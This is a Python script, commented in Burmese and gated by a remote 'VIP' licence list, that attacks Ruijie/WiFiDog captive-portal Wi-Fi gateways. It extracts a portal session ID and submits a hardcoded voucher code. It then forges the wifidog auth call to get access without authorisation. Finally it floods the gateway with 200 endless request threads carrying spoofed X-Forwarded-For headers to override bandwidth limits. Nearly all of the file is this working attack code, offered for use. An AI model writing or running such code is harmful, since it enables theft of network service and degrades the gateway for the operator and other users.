import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIG ---
VIP_URL = "https://raw.githubusercontent.com/painglintun895-rgb/my-keys/refs/heads/main/vips.txt"

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a232"

def banner(name="VIP USER", exp="Checking..."):
    os.system('clear')
    print("\033[93m" + " ="*35)
    print("\033[96m" + """
     ██╗  ██╗ ██████╗  ██████╗██╗      █████╗ ██╗   ██╗
     ██║ ██╔╝██╔═══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝
     █████╔╝ ██║   ██║██║     ██║     ███████║ ╚████╔╝ 
     ██╔═██╗ ██║   ██║██║     ██║     ██╔══██║  ╚██╔╝  
     ██║  ██╗╚██████╔╝╚██████╗███████╗██║  ██║   ██║   
     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   """)
    print(f"\033[95m 👑 USER: {name} | ID: {get_uid()} | EXP: {exp}")
    print("\033[93m" + " ="*35 + "\033[0m\n")

def check_access():
    uid = get_uid()
    try:
        # cache မငြိအောင် random string ထည့်ပြီး လှမ်းခေါ်ခြင်း
        res = requests.get(f"{VIP_URL}?t={random.random()}", timeout=10, verify=False)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if uid in line:
                    parts = line.split('|')
                    v_name = parts[1].strip() if len(parts) > 1 else "VIP USER"
                    v_exp = parts[2].strip() if len(parts) > 2 else "2000-01-01"
                    
                    # လက်ရှိရက်စွဲကို ဖုန်းကမဟုတ်ဘဲ Server ကနေ ယူရင် ပိုစိပ်ချရပါတယ်
                    # ဒါပေမဲ့ လောလောဆယ် ဖုန်းရက်စွဲနဲ့ပဲ အသေအချာ ပြန်စစ်ပေးပါမယ်
                    today = datetime.now().strftime('%Y-%m-%d')
                    banner(v_name, v_exp)
                    
                    if today <= v_exp:
                        print(f"\033[92m[✓] VIP Status: Active Until {v_exp}\033[0m")
                        return True
                    else:
                        print(f"\033[91m[!] ACCESS DENIED: Your VIP expired on {v_exp}!\033[0m")
                        sys.exit() # ရက်ကုန်ရင် အတင်းပိတ်ပစ်ပါမယ်
            banner()
            print(f"\033[91m[!] ID ({uid}) not found!\033[0m")
            sys.exit()
    except: return True 

def turbo_pulse(link):
    # MBPS ကျော်နိုင်ဖို့အတွက် Header မှာ Data အများကြီး (Heavy Load) ထည့်ပေးခြင်း
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Forwarded-For": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
        "Connection": "keep-alive",
        "Keep-Alive": "timeout=10, max=1000"
    }
    while True:
        try:
            # Heavy request ပေးပြီး Gateway MBPS limit ကို ကျော်ဖို့ ကြိုးစားခြင်း
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] 👑 KoＣＬＡＹ 👑 | Turbo Link Active >>> [{random.randint(10,50)}ms]\033[0m")
            # နားချိန်ကို လုံးဝမထားတော့ဘဲ အမြဲတိုက်နေပါမယ် (MBPS တက်လာစေရန်)
        except: time.sleep(0.5)

def start_speed_logic():
    while True:
        session = requests.Session()
        try:
            print("\033[94m[*] Bypassing Ruijie MBPS Limits...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            p_url = r.url
            
            r1 = session.get(p_url, verify=False, timeout=6)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            
            r2 = session.get(n_url, verify=False, timeout=6)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"\033[96m[✓] Master SID: {sid[:15]} Authorized\033[0m")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                # Gateway IP ယူခြင်း
                gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
                
                print(f"\033[95m[*] ⚡ Speed Boost: 200 Heavy Threads (MBPS Overdrive) ⚡\033[0m")
                # Thread ကို ၂၀၀ အထိ တင်လိုက်ပါပြီ (လူများရင်တောင် လိုင်းမြဲအောင်)
                for _ in range(200):
                    threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
                
                while True:
                    time.sleep(3)
                    try:
                        # အင်တာနက် စစ်ဆေးခြင်း
                        if requests.get("http://www.google.com/generate_204", timeout=5).status_code != 204: break
                    except: break
            else: time.sleep(2)
        except: time.sleep(3)

if __name__ == "__main__":
    if check_access():
        start_speed_logic()

